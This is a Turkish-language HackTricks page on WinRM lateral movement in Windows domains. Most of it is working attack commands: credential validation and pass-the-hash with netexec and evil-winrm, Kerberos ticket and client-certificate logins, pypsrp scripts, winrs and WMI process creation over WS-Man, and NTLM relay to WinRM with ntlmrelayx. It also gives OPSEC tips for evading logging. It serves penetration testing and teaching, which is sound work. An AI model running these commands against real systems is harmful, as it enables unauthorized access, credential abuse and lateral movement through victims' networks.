# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM, Windows ortamlarında en kullanışlı **lateral movement** taşımalarından biridir; çünkü SMB service creation hilelerine ihtiyaç duymadan **WS-Man/HTTP(S)** üzerinden uzak shell sağlar. Hedef **5985/5986** portlarını açıyorsa ve principal’ınız remoting kullanabiliyorsa, çoğu zaman "valid creds" durumundan "interactive shell" durumuna çok hızlı geçebilirsiniz.

**protocol/service enumeration**, listeners, WinRM’yi etkinleştirme, `Invoke-Command` ve genel client kullanımı için şunlara bakın:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Operatörler neden WinRM’i sever

- **HTTP/HTTPS** kullanır, SMB/RPC yerine geçer; bu yüzden PsExec-style execution engellendiğinde çoğu zaman çalışır.
- **Kerberos** ile yeniden kullanılabilir credentials’ı hedefe göndermez.
- **Windows**, **Linux** ve **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) ile temiz şekilde çalışır.
- Etkileşimli PowerShell remoting yolu, hedefte kimliği doğrulanmış kullanıcı bağlamında **`wsmprovhost.exe`** başlatır; bu, service-based exec’den operasyonel olarak farklıdır.

## Access modeli ve önkoşullar

Pratikte başarılı WinRM lateral movement, **üç** şeye bağlıdır:

1. Hedefte **WinRM listener** (`5985`/`5986`) ve erişime izin veren firewall kuralları vardır.
2. Hesap endpoint’e **authenticate** olabilir.
3. Hesaba bir remoting session açma izni verilmiştir.

Bu erişimi elde etmenin yaygın yolları:

- Hedefte **Local Administrator** olmak.
- Yeni sistemlerde **Remote Management Users** veya hâlâ bu grubu dikkate alan sistemlerde/bileşenlerde **WinRMRemoteWMIUsers__** grubuna üyelik.
- Local security descriptor’lar / PowerShell remoting ACL değişiklikleri üzerinden açıkça devredilmiş remoting hakları.

Zaten admin yetkili bir kutuyu kontrol ediyorsanız, burada anlatılan teknikleri kullanarak tam admin group membership olmadan da **WinRM access delegate** edebileceğinizi unutmayın:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Lateral movement sırasında önemli authentication tuzakları

- **Kerberos bir hostname/FQDN ister**. IP ile bağlanırsanız client genellikle **NTLM/Negotiate**’e düşer.
- **workgroup** veya cross-trust edge case’lerde NTLM genellikle ya **HTTPS** ya da client üzerinde target’ın **TrustedHosts** listesine eklenmesini gerektirir.
- Workgroup içinde **Negotiate** üzerinden **local accounts** kullanıldığında, built-in Administrator hesabı kullanılmadıkça veya `LocalAccountTokenFilterPolicy=1` olmadıkça UAC remote restrictions erişimi engelleyebilir.
- PowerShell remoting varsayılan olarak **`HTTP/<host>` SPN** kullanır. `HTTP/<host>` başka bir service account’a zaten kayıtlıysa, WinRM Kerberos `0x80090322` ile başarısız olabilir; port-qualified SPN kullanın veya o SPN’nin mevcut olduğu durumda **`WSMAN/<host>`**’a geçin.

Password spraying sırasında valid credentials elde ederseniz, bunların shell verip vermediğini kontrol etmenin en hızlı yolu çoğu zaman WinRM üzerinden doğrulamaktır:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### Doğrulama ve tek seferlik execution için NetExec / CrackMapExec
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Interactive shell’ler için Evil-WinRM

`evil-winrm`, Linux’tan en kullanışlı interactive seçenek olmaya devam eder çünkü **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, dosya transferi ve in-memory PowerShell/.NET loading destekler.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Varsayılan **`HTTP/<host>`** SPN Kerberos hatalarına neden olduğunda, bunun yerine **`WSMAN/<host>`** bileti istemeyi/kullanmayı deneyin. Bu, `HTTP/<host>` zaten başka bir service account’a atanmış olan hardened veya tuhaf enterprise kurulumlarında görülür.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Bu ayrıca, özellikle genel bir `HTTP` ticket yerine bir **WSMAN** servis ticket’i forge ettiğiniz veya istediğinizde, **RBCD / S4U** abuse sonrasında da faydalıdır.

### Certificate-based authentication

WinRM ayrıca **client certificate authentication** destekler, ancak certificate hedef üzerinde bir **local account** ile map edilmiş olmalıdır. Saldırı açısından bu, şu durumlarda önemlidir:

- WinRM için zaten map edilmiş geçerli bir client certificate ve private key’i çaldığınız/dışa aktardığınızda;
- bir principal için certificate almak üzere **AD CS / Pass-the-Certificate** abuse edip ardından başka bir authentication path’e pivot yaptığınızda;
- password-based remoting’den bilinçli olarak kaçınan ortamlarda çalıştığınızda.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM, password/hash/Kerberos auth’a göre çok daha az yaygındır, ancak mevcut olduğunda, password rotation’dan bağımsız kalabilen **passwordless lateral movement** yolu sağlayabilir.

### Python / automation with `pypsrp`

Bir operator shell yerine automation’a ihtiyacınız varsa, `pypsrp` size Python’dan **NTLM**, **certificate auth**, **Kerberos** ve **CredSSP** desteğiyle WinRM/PSRP sağlar.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Daha ayrıntılı kontrol gerekiyorsa, yüksek seviyeli `Client` wrapper yerine daha düşük seviyeli `WSMan` + `RunspacePool` API’leri iki yaygın operator problemi için kullanışlıdır:

- birçok PowerShell client’ının kullandığı varsayılan `HTTP` beklentisi yerine Kerberos service/SPN olarak **`WSMAN`** zorlamak;
- `Microsoft.PowerShell` yerine **JEA** / custom session configuration gibi **non-default PSRP endpoint**’e bağlanmak.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Lateral movement sırasında Custom PSRP endpoints ve JEA önemlidir

Başarılı bir WinRM authentication, her zaman varsayılan unrestricted `Microsoft.PowerShell` endpoint'ine eriştiğiniz anlamına **gelmez**. Olgun ortamlarda, kendi ACL'leri ve run-as davranışları olan **custom session configurations** veya **JEA** endpoint'leri açığa çıkarılabilir.

Zaten bir Windows host üzerinde code execution sahibiyseniz ve hangi remoting surfaces'in mevcut olduğunu anlamak istiyorsanız, registered endpoint'leri enumerate edin:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Kullanışlı bir endpoint mevcutsa, varsayılan shell yerine onu doğrudan hedefleyin:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Pratik saldırı etkileri:

- Bir **restricted** endpoint, yalnızca servis kontrolü, dosya erişimi, process oluşturma veya keyfi .NET / external command execution için doğru cmdlets/functions’ları sunuyorsa lateral movement için yine de yeterli olabilir.
- Yanlış yapılandırılmış bir **JEA** role, `Start-Process`, broad wildcards, writable providers veya amaçlanan kısıtlamaları aşmanıza izin veren custom proxy functions gibi tehlikeli commands’leri açığa çıkarıyorsa özellikle değerlidir.
- **RunAs virtual accounts** veya **gMSAs** ile desteklenen endpoints, çalıştırdığınız commands’lerin effective security context’ini değiştirir. Özellikle, gMSA-backed bir endpoint, normal bir WinRM session classic delegation problemine takılsa bile **second hop** üzerinde **network identity** sağlayabilir.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` built in’dir ve interactive bir PowerShell remoting session açmadan **native WinRM command execution** istediğinizde kullanışlıdır:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Uygulamada unutulması kolay ve önemli olan iki flag vardır:

- `/noprofile`, remote principal **yerel bir administrator** olmadığında çoğu zaman gereklidir.
- `/allowdelegate`, remote shell’in kimlik bilgilerinizi **üçüncü bir host**a karşı kullanmasını sağlar (örneğin, komut `\\fileserver\share` gerektirdiğinde).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operasyonel olarak, `winrs.exe` genellikle aşağıdakine benzer bir remote process chain ile sonuçlanır:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Bunu hatırlamaya değer çünkü service-based exec ve interactive PSRP sessions’dan farklıdır.

### `winrm.cmd` / PowerShell remoting yerine WS-Man COM

Ayrıca `Enter-PSSession` olmadan da **WinRM transport** üzerinden, WS-Man üstünden WMI classes çağırarak execute edebilirsiniz. Bu, transport’u WinRM olarak tutarken remote execution primitive’ini **WMI `Win32_Process.Create`** yapar:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Bu yaklaşım şu durumlarda kullanışlıdır:

- PowerShell logging yoğun şekilde izleniyorsa.
- Klasik bir PS remoting workflow’u değil, **WinRM transport** istiyorsanız.
- **`WSMan.Automation`** COM object etrafında özel tooling geliştiriyor veya kullanıyorsanız.

## NTLM relay to WinRM (WS-Man)

SMB relay signing nedeniyle engellendiğinde ve LDAP relay kısıtlandığında, **WS-Man/WinRM** yine de cazip bir relay target olabilir. Modern `ntlmrelayx.py`, **WinRM relay servers** içerir ve **`wsman://`** ya da **`winrms://`** target’larına relay yapabilir.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
İki pratik not:

- Relay, hedef **NTLM** kabul ettiğinde ve relayed principal WinRM kullanmaya yetkili olduğunda en faydalıdır.
- Son Impacket code, özellikle **`WSMANIDENTIFY: unauthenticated`** isteklerini işler; böylece `Test-WSMan` tarzı probes relay flow'u bozmaz.

İlk WinRM session'ına girdikten sonra multi-hop kısıtlamaları için şunu kontrol et:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC ve detection notları

- **Interactive PowerShell remoting** hedefte genellikle **`wsmprovhost.exe`** oluşturur.
- **`winrs.exe`** çoğunlukla **`winrshost.exe`** ve ardından istenen child process'i oluşturur.
- Custom **JEA** endpoints, işlemleri **`WinRM_VA_*`** virtual accounts veya yapılandırılmış bir **gMSA** olarak çalıştırabilir; bu da normal kullanıcı-context shell'e kıyasla hem telemetry'yi hem de second-hop davranışını değiştirir.
- Eğer raw `cmd.exe` yerine PSRP kullanırsan **network logon** telemetry'si, WinRM service event'leri ve PowerShell operational/script-block logging bekle.
- Sadece tek bir command gerekiyorsa, `winrs.exe` veya tek kullanımlık WinRM execution, uzun ömürlü interactive remoting session'dan daha sessiz olabilir.
- Kerberos kullanılabiliyorsa, IP + NTLM yerine **FQDN + Kerberos** tercih et; bu hem trust issues'ları hem de client tarafındaki zahmetli `TrustedHosts` değişikliklerini azaltır.

## References

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
